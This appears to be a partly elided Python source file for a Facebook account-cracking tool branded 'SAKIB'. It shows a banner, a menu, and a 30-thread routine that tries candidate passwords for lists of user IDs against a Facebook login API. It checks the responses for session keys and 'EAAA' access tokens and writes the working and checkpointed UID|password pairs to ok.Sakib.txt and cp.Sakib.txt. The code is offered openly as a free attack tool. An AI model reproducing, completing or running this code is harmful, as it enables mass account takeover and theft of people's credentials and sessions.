...
logo = ("""\033[1;32m
\t\033[1;32m $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\ $$$$$$$\  
\t\033[1;32m$$  __$$\ $$  __$$\ $$ | $$  |\_$$  _|$$  __$$\ 
\t\033[1;32m$$ /  \__|$$ /  $$ |$$ |$$  /   $$ |  $$ |  $$ |
\t\033[1;32m\$$$$$$\  $$$$$$$$ |$$$$$  /    $$ |  $$$$$$$\ |
\t\033[1;32m \____$$\ $$  __$$ |$$  $$<     $$ |  $$  __$$\ 
\t\033[1;32m$$\   $$ |$$ |  $$ |$$ |\$$\    $$ |  $$ |  $$ |
\t\033[1;32m\$$$$$$  |$$ |  $$ |$$ | \$$\ $$$$$$\ $$$$$$$  |
\t\033[1;32m \______/ \__|  \__|\__|  \__|\______|\_______/ 
                                                
                                                
                                                

\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[💚]     \033[1;32mCREATED BY\33    :  \033[1;33mMOHIMENUL\33[0;m\033[1;32m
\033[1;32m[🙂]     \033[1;32mFACEBOK      : \033[1;34m MOHIMENUL ISLAM
\033[1;32m[💫]     \033[1;32mGITHUB       :  \033[1;35mH4X-GG
\033[1;32m[🔴]     \033[1;32mTOOL VIRSION :  \033[1;36m1.0.4
\033[1;32m[☺️]    \033[1;32m TOOL TYPE    : \033[1;32m FREE
\033[1;92m══════════════════════════════════════════════════════""")
class Main:
	def __init__(self):
		self.id = []
		...
		os.system("clear")
		print(logo)
		print('\33[37;41m\t\t70% CP ID will just now login\33[0;m')
		print("\033[0;90m ════════════════════════════════════════════════════")
		...
		if Talha in ["1", "01"]:
			self.fbtua()
		if Talha in ["2", "02"]:
			os.system('xdg-open https://www.youtube.com/@Mohammad.Raihan.143')
		if Talha in ["3", "03"]:
			os.system('xdg-open https://www.youtube.com/@Mohammad.Raihan.143')
		if Talha in ["0", "00"]:
			self.old2()
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print(" \033[0;96m[+] Note: CP Open 70 % JUST NOW")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[SAKIB-🥰] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.Sakib.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [SAKIB-CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent :\033[1;96m %s'%(ua))
				open("cp.Sakib.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
